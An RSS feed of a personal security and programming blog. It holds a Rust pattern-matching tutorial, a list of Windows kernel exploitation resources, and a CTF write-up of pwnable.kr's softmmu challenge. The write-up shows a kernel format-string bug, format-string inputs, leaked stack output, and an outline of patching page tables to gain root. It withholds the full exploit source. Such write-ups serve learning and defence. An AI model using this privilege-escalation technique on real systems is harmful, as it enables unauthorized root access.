<?xml version="1.0" encoding="UTF-8"?> 
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ᛟYael</title>
    <description>Yael's Digital Grimoire</description>
    <link>https://anti.moe/~~yael</link>
    <atom:link href="https://anti.moe/~~yaelrss.xml" rel="self" type="application/rss+xml" />
    <item>
  <title>LOBFS - Library of Babel File System</title>
  <description>
    <![CDATA[
<p>Blog post coming soon~</p>

<p>Project can be found <a href="https://github.com/konata-chan404/LOBFS">here</a></p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-lobfs.txt</guid>
  <link>gopher://localhost:7070/0.//article-lobfs.txt</link>
  <pubDate>Sat, 17 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>Window Kernel Resources</title>
  <description>
    <![CDATA[
<p>Recently I&#8217;ve been putting all of my efforts into learning Window Internals and it&#8217;s kernel, this list is for personal archive purposes~
It&#8217;s ever growing &lt;3</p>

<p><a href="https://fuzzysecurity.com/tutorials.html">FuzzySecurity&#8217;s Internals series</a></p>

<p><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSysExtremeVulenrableDriver</a></p>

<h1 id="tools">Tools</h1>

<p><a href="http://virtualkd.sysprogs.org/">VirtualKD</a></p>

<p><a href="https://www.osronline.com/article.cfm?article=157">OSR Driver Loader</a></p>

<h1 id="writeups">Writeups</h1>

<p><a href="https://h0mbre.github.io/RyzenMaster_CVE/">CVE&#8211;2020&#8211;12928 Exploit Proof-of-Concept</a></p>

<p><a href="https://connormcgarr.github.io/cve-2020-21551-sploit/">CVE&#8211;2021&#8211;21551 - Dell ‘dbutil_2_3.sys’</a></p>

<h1 id="vulenrabledrivers">Vulenrable Drivers</h1>

<p><a href="https://github.com/namazso/physmem_drivers">Physmem Drivers</a></p>

<p><a href="https://github.com/eclypsium/Screwed-Drivers/tree/master">Screwed Drivers</a></p>

<h1 id="bootkits">Bootkits</h1>

<p><a href="https://github.com/Mattiwatti/EfiGuard">EfiGuard</a></p>

<p><a href="https://github.com/memN0ps/bootkit-rs">bootkit-rs</a></p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-windowskernel.txt</guid>
  <link>gopher://localhost:7070/0.//article-windowskernel.txt</link>
  <pubDate>Thu, 15 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>New Website using cl-yag</title>
  <description>
    <![CDATA[
<p>I commonly fall for what i call &#8220;Website Envy&#8221; - looking at other&#8217;s awesome sites and wanting mine to be just like that. So here&#8217;s a post detailing exactly that!</p>

<h2 id="acyberspace">A Cyberspace</h2>

<p>Recently I&#8217;ve tapped into the gopherspace, geminiverse and the World Wide Web as well. So many fun, interesting and downrigh beautiful webpages.
I was always in favor of static generated websites, with no backend and little as of effort on the clientside and discovering a whole slew of pages pushing that agenda with great content has just opened my eyes.</p>

<h2 id="cl-yag">cl-yag</h2>

<p>My last website was built with <a href="https://jaspervdj.be/hakyll/">Hakyll</a>, a static site generator written and operating in Haskell. It&#8217;s a great piece of software that highlights the declartive nature of functionl programming and how to leverage it using real applications. In my adventures I came across <a href="https://dataswamp.org/~solene/">Solene&#8217;s site</a>, a great hub of general computing, OpenBSD and NixOS. It&#8217;s design was minimal and elegant, yet robust enough to host plenty of content.</p>

<p>I decided to take her project <code>cl-yag</code> and use it for my own site - after a bit of lisp hacks it is now complete. You&#8217;re probably reading on it right now as well (Apologies reader futures after the inevitable changes).</p>

<h2 id="gophergemini">Gopher &amp; Gemini</h2>

<p>These protocols were first class requirements for my new website, although as of right now I don&#8217;t have a gopher or a gemini server running there&#8217;s full support for it. I can&#8217;t wait to join y&#8217;all in a bit~</p>

<h2 id="thoughts">Thoughts</h2>

<p>The modern web has consumed and taken from us so much, but I&#8217;m so happy there&#8217;s a niche for this still. I absolutely adore this kind of stuff and I&#8217;m glad I could add my website to this niche in the cyberspace.</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-cl-yag.txt</guid>
  <link>gopher://localhost:7070/0.//article-cl-yag.txt</link>
  <pubDate>Sat, 10 Jun 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>Why I love Rust: Pattern Matching</title>
  <description>
    <![CDATA[
<p>My journey with Rust has been rocky to say the least, from fandom to hating back to loving it, I never stopped learning about how I program and engineer. I&#8217;m a huge nerd of Functional Programming and the thing that absolutely sold me about rust is it&#8217;s algebric type system, it is my biggest joy to bring type proofness and complexity to low level programs. The pattern matching in it makes for expressive, readable and type-safe code. In this blog article we will take a look at this topic, and I hope you can learn something from it :3</p>

<h2 id="patterns">Patterns</h2>

<h3 id="refutablevsirrefutable">Refutable vs irrefutable</h3>

<p>Patterns in Rust come in two types; refutable and irrefutable. Patterns that match conditionally are called refutable, while patterns that match any possible value are called irrefutable. Which one you can use will depend on the context. For example, a let-statement will need a irrefutable pattern, because what would happen if a variable in a let-statement doesn’t get a value?</p>

<pre><code class="rust">// Irrefutable patterns - variable bindings, always succeeds
let x = 5;
let (x, y) = (1, 2);

// Doesn't compile
let Ok(x) = string.parse::&lt;i32&gt;() // parsing a string will return a Result&lt;T&gt;, and it is refutable whether it's an OK(x)
</code></pre>

<p>if let statements on the other hand can have refutable patterns, as the body is evaulated conditionally and it&#8217;s refutability is inherent:</p>

<pre><code class="rust">if let Ok(x) = string.parse::&lt;i32&gt;() {
  // ... do something if string can be parsed as a 32 bit integer ...
}

// if let can have a refutable pattern, so we can also use a value for x:
if let Ok(64) = someString.parse::&lt;i32&gt;() {
  // ... do something if string can be parsed as a 32 bit integer ...
}
</code></pre>

<h2 id="destructuring">Destructuring</h2>

<p>Many patterns destructure various types, and they can also be mixed and match together. Let’s look at some of them together~</p>

<h3 id="tuples">Tuples</h3>

<p>You are already probably familiar with tuple destructuring, but let&#8217;s examine again:</p>

<pre><code class="rust">// tuple: (i32, i32, &amp;str)
let tuple = (1, 2, &quot;three&quot;);
let (x, y, z_str) = tuple;
</code></pre>

<p>We see in the last line that tuple is destructured into 3 new variables: x, y, and z_str.
This can be done for all sorts of tuples, as long as the destructured types match.</p>

<p>My favorite trick is that you can match elements with <code>..</code> or <code>_</code>, which are used to skip elements and create more complex logic:</p>

<pre><code class="rust">// discard z_str
let (x, y, _) = tuple;

// get only x
let (x, ..) = tuple;

let big_tuple = (1, 2, 3, 4, 5);

// Does not compile, ambigious pattern.
let (..., middle, ...) = big_tuple;
</code></pre>

<p>(Patterns have to be unambigious)</p>

<h3 id="structs">Structs</h3>

<p>Structs are not much different than tuples, i&#8217;ll save your internet bandwidth by not showing an example although it is very self explanatory. The only difference is the .. behaviour, when deconstructing it has to come last and it means to match the rest and ignore the result.</p>

<h3 id="enums">Enums</h3>

<p>This might be the simplest yet most important of them all, the simplest case for enum deconstructing is to match one with no data:</p>

<pre><code class="rust">// simple enum
enum TrafficSignal {
    Red,
    Orange,
    Green
}

// match if our color is green
if let Color::green = my_color {
    // cars go!
}
</code></pre>

<p>Luckily, Rust enums are way way more interesting as they contain data. So much complexity arises out of that.</p>

<pre><code class="rust">// complex enum
enum Enemy {
    Alive(u32),
    Dead
}

// match against an alive enemy
if let Enemy::Alive(data) = my_enemy {
    // oh no! gotta beat them &gt;:3
}

// match against a dead enemy
if let Enemy::Dead = my_enemy {
    // you win~!
}
</code></pre>

<h2 id="otherpatterns">Other Patterns</h2>

<p>There are other types of patterns in Rust that capture a lot of elementary and cool behaviour. Since they&#8217;re varied it is best to just demonstrate them:</p>

<pre><code class="rust">// OR pattern

1 | 2 | 3 // matches 1, 2, or 3
&quot;one&quot; | &quot;two&quot; // matches one of these two strings

// range pattern

1..=10 // matches 1 to 10 (inclusive)
1..10 // matches 1 to 10 (non-inclusive)

// at pattern
struct Point {
    x: i32,
    y: i32
}

// matches if my_x exists under an optional condition
if let Point {x: my_x @ 1..=10, ..} = my_data {
    // my_x is between 1 and 10.
}
</code></pre>

<h2 id="thepayoff">The Payoff</h2>

<p>pattern matching is closely related to Rust&#8217;s powerful algebric type system. We can combine the different behaviours of patterns in order to write clear and simply awesome code~!<br>
One example that speaks to itself and shows the immense power pattern matching has is to pit it against object-oriented code. let&#8217;s consider a case where we have a Shape hierarchy with two concrete classes (Circle and Rectangle), we&#8217;ll compare the object-oriented approach in java with the pattern matching code in Rust.</p>

<h3 id="javaoop:">Java (OOP):</h3>

<pre><code class="java">abstract class Shape {
    abstract double calculateArea();
}

class Circle extends Shape {
    private double radius;

    public Circle(double radius) {
        this.radius = radius;
    }

    public double calculateArea() {
        return Math.PI * radius * radius;
    }
}

class Rectangle extends Shape {
    private double width;
    private double height;

    public Rectangle(double width, double height) {
        this.width = width;
        this.height = height;
    }

    public double calculateArea() {
        return width * height;
    }
}

public class Main {
    public static void main(String[] args) {
        Shape shape = new Circle(5.0);

        if (shape instanceof Circle) {
            Circle circle = (Circle) shape;
            double area = circle.calculateArea();
            System.out.println(&quot;Area of Circle: &quot; + area);
        } else if (shape instanceof Rectangle) {
            Rectangle rectangle = (Rectangle) shape;
            double area = rectangle.calculateArea();
            System.out.println(&quot;Area of Rectangle: &quot; + area);
        }
    }
}
</code></pre>

<h3 id="rustpatternmatching:">Rust (Pattern Matching):</h3>

<pre><code class="rust">enum Shape {
    Circle(f64),
    Rectangle(f64, f64),
}

fn calculate_area(shape: Shape) -&gt; f64 {
    match shape {
        Shape::Circle(radius) =&gt; std::f64::consts::PI * radius * radius,
        Shape::Rectangle(width, height) =&gt; width * height,
    }
}

fn main() {
    let circle = Shape::Circle(5.0);
    let circleArea = calculate_area(circle);
    let rectangle = Shape::Rectangle(5.0, 2.0);
    let rectangleArea = calculate_area(rectangle);
    
    println!(&quot;Area of Circle: {circleArea}&quot;, circleArea);
    println!(&quot;Area of Rectangle: {rectangleArea}&quot;, rectangleArea);
}
</code></pre>

<h3 id="conclusions">Conclusions</h3>

<p>I could go on about it for much longer, although I hope that was enough for the knowledge-hungry.
I hope you now understand pattern matching a little better and see how it is a fundamental and powerful feature in Rust that contributes to its overall expressiveness and safety. Embracing it in my code greatly enchanced my programming exprience and generally leads to more robust and maintanable applications.</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-rustpatterns.txt</guid>
  <link>gopher://localhost:7070/0.//article-rustpatterns.txt</link>
  <pubDate>Tue, 16 May 2023 00:00:00 GMT</pubDate>
</item>
<item>
  <title>pwnable.kr's softmmu - An Awesome Linux Kernel Exploit</title>
  <description>
    <![CDATA[
<p>Over the years of my CTF&#8217;ing I always come back to <a href="https://pwnable.kr">pwnable.kr</a>, although a tad outdated it&#8217;s a vast source of simply awesome binary exploitation and pwn challanges. In particular their kernel exploitation series of challanges interest me - they&#8217;re really well made and good introductory material on the matter. Per the policies on the site, this writeup won&#8217;t share any source code and try to be minimal as possible.</p>

<p>The last of those challanges is <em>softmmu</em>, here&#8217;s the readme:</p>

<blockquote>
<p><strong><em>If you are good at kernel exploit, try this one :)</em></strong></p>
</blockquote>

<p><img src="./static/img/softmmu/softmmu.png" style="width:20%"></p>

<h2 id="thechallange">The Challange</h2>

<p>We&#8217;re given two things: a linux kernel object file containing some sort of a driver, and access to a fairly old linux virtual machine loaded with asid driver. Before we open the executable for further inspection in IDA, let&#8217;s SSH into the machine and check what it does.</p>

<pre><code class="shell">...
[+] Loading x86 PAE MMU emulator
[+] Write the virtual address to /proc/softmmu
[+] You can obtain it's physical address by reading /proc/softmmu
[+] i.e. echo -ne 'x00x80x04x08' &gt; /proc/softmmu; hexdump -C /proc/softmmu
[+] Let the kernel exploit begin :)

$ uname -a
Linux (none) 3.7.1 #1 SMP Mon Dec 23 06:07:19 PST 2013 i686 GNU/Linux
$ ls /*.ko
/softmmu.ko
</code></pre>

<p><em>Hmm</em>, it prints out a pretty explanation for us :3 As the name softmmu hints - the module interfaces with the Linux kernel memory&#8217;s and emulates a x86 Page Address Extension for the MMU. The interface with the module seems to be very straightforward, we write a virtual address to the device file /proc/softmmu and then read back the physical address.</p>

<h2 id="findingavulnerability">Finding A Vulnerability</h2>

<p>Our end goal is to get root, so we definitely have to find a vulnerability to expoloit in the softmmu module. Let&#8217;s open the kernel object file in IDA to analyze:</p>

<p><img src="./static/img/softmmu/overview.png" style="width:70%"></p>

<p>A fairly tame program, not too many functions and fairly straightforward structure. We are not going to reverse the entire program (since I found the vulnerability quickly) but here are some pointers:</p>

<blockquote>
<p>We cannot request the physical addresses of ones outside userspace (seems important for the exploit).
It recursively traverses page table within the mmu_walk() function in order to retrieve addresses.
Program contains verbose output for debugging purposes.</p>
</blockquote>

<p>The last point is particulary important; it allows us to understand the inner workings better and perhaps find a vulnerability to exploit, let&#8217;s look at the debugging code.</p>

<pre><code class="c">__int64 __usercall get_pte_entry@&lt;edx:eax&gt;(int a1@&lt;eax&gt;, char *a2@&lt;edx&gt;)
{
  int v2; // ebx

  v2 = *(_DWORD *)&amp;a2[8 * ((a1 &amp; 0x1FF000u) &gt;&gt; 12)];
  if ( (v2 &amp; 1) != 0 )
  {
    printk(&quot;[Debug] PGD(%x) Dumpn&quot;, a2);
    printk(
      &quot;[task:%s] %p:%02x %p:%02x %p:%02x %p:%02xn&quot;,
      (const char *)(__readfsdword((unsigned int)&amp;current_task) + 740),
      a2,
      *a2,
      a2 + 1,
      a2[1],
      a2 + 2,
      a2[2],
      a2 + 3,
      a2[3]);
    printk(&quot;[Debug] Dump Virtual Addressn&quot;);
    printk(&quot;n===============================n&quot;);
    printk((const char *)req_vaddr);
    printk(&quot;n===============================n&quot;);
  }
  return v2;
}
</code></pre>

<p>Fairly bloaty raw decompiled code, but breaking it down it is very simple: it retrieves a page table entry from a PD64 (Page Global Directory entry). Besides the pretty cool kernel level code, the vulnerability here is glaringly obvious - the program passes the address we request (a global variable) to printk().</p>

<blockquote>
<p>printk((const char *)req_vaddr);</p>
</blockquote>

<h4 id="boom">Boom~!</h4>

<p>We found a string format vulnerability we can control :3 </p>

<h2 id="writingtheexploit-pt.1">Writing The Exploit - Pt. 1</h2>

<p>So far this hasn&#8217;t been a challenge for kernel experts, even a script kiddie can find this vulnerability. I must admit, writing the exploit is much more difficult because a plethora of reasons.</p>

<p>In order to pass a string to the module, we&#8217;d have to allocate some bytes in the process memory space. Let&#8217;s try compile a simple C program on the remote machine to do just that:</p>

<pre><code class="shell">/tmp $ gcc pwn.c
sh: gcc: not found
</code></pre>

<p><em>Oof</em>, that means we have to cross compile.
The first problem that imposes us is the fact the remote machine is running a really outdated version of the kernel, paired with the fact it doesn&#8217;t have internet access it really limits us in how we compile for it.
The soltuion that I came up with was as follows
compile a static no-stdlib program -&gt; compress it -&gt; base64 the tar.gz -&gt; do the reverse on remote.</p>

<h4 id="thismeanswritingaminimallibcfromscratchgoodluckme...">This means writing a minimal libc from scratch, <em>good luck me</em>&#8230;</h4>

<p>After a fair amount of work, I got to a level where I had all of the necessary API&#8217;s to leverage the vulnerability
On local machine:</p>

<pre><code class="shell">yael@covenstead:~/softmmu$ gcc pwn.c -nostdlib -m32 -static -o /dev/stdout | gzip - | base64 -w 0
H4sIAAAAAAAAA+1bfWwT5xlz3YSjziNYdmW0nR1p2iE0phAUpY0k0gCB2kFw4RYa9dS49hHEsd2PPtcEgYrzIuI5VnLgE2a1j+Q9v2hqdpUpPHPsqZt...
</code></pre>

<p>On Remote:</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%x %x %x %xn&quot;
&lt; paste base64 code here &gt;
[ 1406.371600] virtual address set to dede000
[ 1406.371963] [Debug] PGD(c2ad1000) Dump
[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.372963] [Debyg] Dump Virtual Address
[ 1406.373234]
[ 1406.373234] =============================
[ 1406.373627] c2eb7514 c2ad21000 0 c2ad21001 0
======================================
[ 1406.374963] [Debug] PGD(c2ad1000) Dump
[ 1406.374520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.374963] [Debyg] Dump Virtual Address
[ 1406.375234]
[ 1406.375234] =============================
[ 1406.375627] c2eb7514 c2ad21000 0 c2ad21001 0
======================================
[&lt;3] softmmu output: 0xBFB81288
</code></pre>

<p>Awesome~! We&#8217;re able to leak addresses off the stack :3
Finally some progress, we should try running the forsakened %n&#8230;</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x &quot;%65n&quot;
&lt; ... &gt;
[ 1406.371600] virtual address set to dede000
[ 1406.371963] [Debug] PGD(c2ad1000) Dump
[ 1406.372520] [task:x] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.372963] [Debyg] Dump Virtual Address
[ 1406.373234]
[ 1406.373234] =============================
[ 1406.373627]                                                               
======================================
[ 1406.374963] [Debug] PGD(c2ad1000) Dump
[ 1406.374520] [task:A] c2ad1000:00 c2ad1001:00 c2ad1002:00 c2ad1003:00
[ 1406.374963] [Debyg] Dump Virtual Address
[ 1406.375234]
[ 1406.375234] =============================
[ 1406.375627]                                                        
======================================
[&lt;3] softmmu output: 0xBFB81288
</code></pre>

<p>OMG, it worked and we wrote into the process name &lt;3! (As seen in the debug messages) All of this work wasn&#8217;t for nothing.</p>

<h2 id="writingtheexploit-pt.2">Writing The Exploit - Pt. 2</h2>

<p>Now for the second part of the exploit, we have to figure out how the hell we take advantage of the format string vulnerability. This isn&#8217;t like the average format string attack as it&#8217;s not performed on a userland stack, but a kernel one. Besides our request address which occasionally surfaces down the stack we get nada.</p>

<p>Luckily for us we have a bunch of debug values on the stack, some of them might be incredibly useful to craft an exploit. <strong><em>Yes!</em></strong> The stack is setup in a way we can write to the page table entry any arbtriary value we want, hence we change the permissions of a kernel pages and execute our code as supervisor :3
(We have a pointer for each byte and the corresponding address)</p>

<p>Since we have to fully comperhend the paging mechanism in full detail to execute this exploit properly, here&#8217;s a diagram of the Page Table Entry structure:</p>

<p><img src="./static/img/softmmu/pte.png" style="width:70%"></p>

<p>There are many bits and flops, but assuming basic knowledge of paging nothing is too out of ordinary. The first three flags are interesting: P (<strong>P</strong>resent), R/W (<strong>R</strong>ead/<strong>W</strong>rite) and U/S (<strong>U</strong>ser/<strong>S</strong>upervisor).
If the <strong>P</strong>resent bit is set then the page is actually in physical memory at the moment, if the <strong>R</strong>ead and <strong>W</strong>rite bit is set then the page is both readable and writable (if not then it is read only) and lastly the <strong>U</strong>Ser/<strong>S</strong>upervisor bit is set based on privellege level.</p>

<p>We can get to work on patching the bytes of the PTE, we are able to patch one of our userspace page entries to pount to a physical adress that contains the kernel code of sys_setresuid() and make it writable. Once we got that we can flip the prillege check from je to jne, call setresuid(0) and obtain root &gt;:3</p>

<pre><code class="shell">/ $ base64 -d | gunzip - &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; /tmp/x
&lt; ... &gt;
{CENSORED_FLAG}
/ # whoami
</code></pre>

<h2 id="conclusions">Conclusions</h2>

<p>This without a doubt is a serious challenge full of hurdles. Personally for me it symbolizes some sort of maturity in my cybersecurity journey, I learned so much throughout and I can&#8217;t wait to do more.</p>

<p>About the softmmu itself, this post only showed the a small part of the failures. So much stuff I first tried didn&#8217;t end up working at the end, this only shows how deep and complex it gets. I believe it is a prime example of diving deep and reading old documentation about the kernel&#8217;s inner workings and trying to figure it all out.</p>

<p><img src="./static/img/softmmu/softmmu_completed.png" style="width:20%"></p>

<p>TLDR: the kernel is complex</p>

    ]]>
  </description>
  <guid>gopher://localhost:7070/0.//article-softmmu.txt</guid>
  <link>gopher://localhost:7070/0.//article-softmmu.txt</link>
  <pubDate>Sun, 12 Feb 2023 00:00:00 GMT</pubDate>
</item>

  </channel>
</rss>
